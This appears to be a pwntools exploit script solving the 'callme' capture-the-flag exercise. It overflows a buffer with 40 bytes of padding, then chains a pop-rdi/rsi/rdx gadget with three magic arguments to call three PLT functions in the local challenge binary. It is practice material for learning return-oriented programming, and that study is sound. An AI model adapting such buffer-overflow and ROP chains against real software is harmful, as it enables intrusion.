from pwn import *
elf = ELF("callme")

rdiRsiRdxGadget = 0x40093c
param1 = 0xdeadbeefdeadbeef
param2 = 0xcafebabecafebabe
param3 = 0xd00df00dd00df00d
fun1 = elf.plt["callme_one"]
fun2 = elf.plt["callme_two"]
fun3 = elf.plt["callme_three"]

payload = b"a" * 40
payload += p64(rdiRsiRdxGadget)
payload += p64(param1)
payload += p64(param2)
payload += p64(param3)
payload += p64(fun1)
payload += p64(rdiRsiRdxGadget)
payload += p64(param1)
payload += p64(param2)
payload += p64(param3)
payload += p64(fun2)
payload += p64(rdiRsiRdxGadget)
payload += p64(param1)
payload += p64(param2)
payload += p64(param3)
payload += p64(fun3)
io = elf.process()
io.sendline(payload)
io.interactive()
